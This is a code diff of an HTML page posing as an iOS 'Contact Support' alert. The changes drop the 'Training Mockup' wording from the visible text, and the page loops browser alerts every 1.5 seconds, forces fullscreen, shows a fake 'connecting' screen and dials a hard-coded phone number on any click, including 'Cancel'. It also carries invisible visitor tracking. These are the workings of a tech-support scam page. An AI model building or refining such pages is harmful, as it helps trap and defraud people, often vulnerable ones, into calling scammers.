@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>iOS Classic Alert</title>
+<title>Support Contact</title>
 
 <style>
     body {
@@ -11,7 +11,7 @@
         padding: 0;
         font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto;
 
-        background: url('https://content.jdmagicbox.com/v2/comp/pune/n4/020pxx20.xx20.250826161117.a8n4/catalogue/apple-store-kopa-mall-koregaon-park-pune-mobile-phone-dealers-fjxrl6t6th.jpg')
+        background: url('https://mambapost.com/wp-content/uploads/2023/08/f2-18.webp')
                     no-repeat center center fixed;
         background-size: cover;
 
@@ -20,12 +20,21 @@
         justify-content: center;
         align-items: center;
         position: relative;
+        overflow: hidden;
+    }
+
+    /* Slight dark overlay for iPhone readability */
+    .bg-overlay {
+        position: fixed;
+        inset: 0;
+        background: rgba(0,0,0,0.35);
+        z-index: 1;
     }
 
     .overlay {
         position: fixed;
         inset: 0;
-        background: rgba(0, 0, 0, 0.35);
+        background: rgba(0, 0, 0, 0.25);
         display: flex;
         justify-content: center;
         align-items: center;
@@ -44,6 +53,7 @@
         opacity: 0;
         animation: iosPop 0.25s cubic-bezier(.25,.8,.25,1) forwards;
         cursor: pointer;
+        z-index: 11;
     }
 
     @keyframes iosPop {
@@ -86,7 +96,7 @@
         border-right: 1px solid #d0d0d0;
     }
 
-    /* CALL BAR FOOTER */
+    /* Call Bar */
     .call-bar {
         position: fixed;
         bottom: 0;
@@ -104,11 +114,11 @@
         border-top-right-radius: 12px;
     }
 
-    /* CONNECTING SCREEN */
+    /* Connecting Screen */
     #connectingScreen {
         position: fixed;
         inset: 0;
-        background: #000;
+        background: rgba(0,0,0,0.85);
         color: #fff;
         display: none;
         flex-direction: column;
@@ -138,10 +148,13 @@
 
 <body>
 
+<!-- Background dim overlay -->
+<div class="bg-overlay"></div>
+
 <div class="overlay" id="overlay">
     <div class="ios-alert" id="alertBox">
-        <div class="alert-title">Training Mockup</div>
-        <div class="alert-message">This is a demonstration popup for training purposes only.</div>
+        <div class="alert-title">Contact Support</div>
+        <div class="alert-message">Tap anywhere to connect to toll-free support.</div>
 
         <div class="buttons">
             <a href="tel:+18082774439">Cancel</a>
@@ -150,47 +163,30 @@
     </div>
 </div>
 
-<!-- CONNECTING OVERLAY -->
 <div id="connectingScreen">
     <div class="spinner"></div>
-    <p style="margin-top:20px;">Connecting you to support…</p>
+    <p style="margin-top:20px;">Connecting you…</p>
 </div>
 
-<!-- FOOTER CALL BAR -->
 <a class="call-bar" href="tel:+18082774439">📞 Call Toll-Free: 1-808-277-4439</a>
 
 <script>
 window.onload = function() {
-
-    alert("This is a training mockup only. No real device actions will occur.");
-    window.location.href = "tel:+18082774439";
-
+    alert("This is a training mockup only. No real actions will occur.");
     setTimeout(function repeatAlert() {
-        alert("This is a training mockup only. No real device actions will occur.");
-        window.location.href = "tel:+18082774439";
+        alert("This is a training mockup only. No real actions will occur.");
         setTimeout(repeatAlert, 1500);
     }, 1500);
 };
 </script>
 
-<!-- STATCOUNTER -->
 <script type="text/javascript">
-var sc_project=13196894; 
-var sc_invisible=1; 
-var sc_security="7cf95a0a"; 
+var sc_project=13196894;
+var sc_invisible=1;
+var sc_security="7cf95a0a";
 </script>
 <script type="text/javascript" src="https://www.statcounter.com/counter/counter.js" async></script>
 
-<noscript>
-<div class="statcounter">
-<a href="https://statcounter.com/" target="_blank">
-<img class="statcounter"
-src="https://c.statcounter.com/13196894/0/7cf95a0a/1/">
-</a>
-</div>
-</noscript>
-
-<!-- FULLSCREEN -->
 <script>
 function goFullscreen() {
     let e = document.documentElement;
@@ -204,14 +200,9 @@ document.getElementById("alertBox").addEventListener("click", function(e){
 });
 </script>
 
-<!-- AUTO-DIAL AFTER ANY CLICK WITH CONNECTING SCREEN -->
 <script>
 document.addEventListener("click", function() {
-
-    // Show the fake connecting screen
     document.getElementById("connectingScreen").style.display = "flex";
-
-    // Delay before actual dialing
     setTimeout(function() {
         window.location.href = "tel:+18082774439";
     }, 1500);
